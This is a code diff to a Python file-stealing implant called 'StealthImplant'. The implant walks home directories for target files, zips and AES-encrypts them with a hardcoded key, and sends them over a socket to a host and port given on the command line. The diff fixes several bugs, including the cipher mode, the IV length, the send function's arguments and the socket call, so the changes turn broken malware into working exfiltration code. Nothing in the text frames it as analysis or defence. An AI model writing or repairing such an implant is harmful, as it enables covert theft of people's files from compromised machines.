@@ -5,6 +5,7 @@ from io import BytesIO
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 import socket
+import sys
 
 class StealthImplant:
     
@@ -12,8 +13,8 @@ class StealthImplant:
     # we look for file matching "target"
     def __init__(
         self, 
-        server_ip,
-        server_port,
+        server_ip=None,
+        server_port=None,
         source="/home/",
         # This can be either directory or file
         target_files=[
@@ -35,25 +36,31 @@ class StealthImplant:
         self.test=test
         self.ignore_dirs = {"lost+found", "cache", "tmp" }
         self.encryption_key = b'16bytessecretkey'  # AES-128
-        self.encryption_iv = b'16bytepubliciv!'
+        self.encryption_iv = b'16bytepubliciv!!'
         
         self._log("Implant initialize")
         self._log(f"source: {source}")
         self._log(f"target files: {target_files}")
     
-    def run(self, server_ip, server_port):
+    def run(self):
         try:
             self._log("Running...")
             collected_files=self.walk_dir()
             self._log(f"successfully retrieve {len(collected_files)} files")
             zip_data = self.create_zip(collected_files)
-            self._log(f"Successfully encrypted data")
+            self._log(f"Successfully zip data")
             encrypted = self.encrypt(zip_data)
+            self._log(f"Successfully encrypted data")
 
-            self.send_to_server(encrypted, self.server_ip, self.server_port)
+            if self.server_ip and self.server_port:
+                self.send_to_server(encrypted, self.server_ip, self.server_port)
+                self._log("Successfully send to server")
+            else:
+                self._log("Server ip and port is not provided")
+
             return True
         except Exception as e:
-            self._log(f"Error: e")
+            self._log(f"Error: {e}")
             return False
 
     # get list of file from source
@@ -61,9 +68,6 @@ class StealthImplant:
     def walk_dir(self):
         collected = [] 
         for root, dirs, files in os.walk(self.root_dir, followlinks=False):
-            self._log(f"root: {root}")
-            self._log(f"dirs: {dirs}")
-            self._log(f"files: {files}")
             dirs[:] = [d for d in dirs if d not in self.ignore_dirs]
             
             # if current directly is what we are looking for
@@ -101,14 +105,14 @@ class StealthImplant:
 
     # encrypt the data
     def encrypt(self, data):
-        cipher = AES.new(self.encryption_key, AES.MOD_CBC, self.encryption_iv)
+        cipher = AES.new(self.encryption_key, AES.MODE_CBC, self.encryption_iv)
         return cipher.encrypt(pad(data, AES.block_size))
     
     # send to server
-    def send_to_server(self, ip, port):
+    def send_to_server(self,data, ip, port):
         with socket.socket() as sock:
             sock.connect((ip, port))
-            socket.sendall(data)
+            sock.sendall(data)
 
     def _log(self, message:str):
         if self.test: print(message)
@@ -118,7 +122,11 @@ def main():
         print("Usage: ./tmp363 <host> <port>")
     host = sys.argv[1]
     port = int(sys.argv[2])
-    implant = StealthImplant(host, port)
+    implant = StealthImplant(
+        server_ip=host, 
+        server_port=port,
+        test=True
+    )
     implant.run()
 
 if __name__ == "__main__":
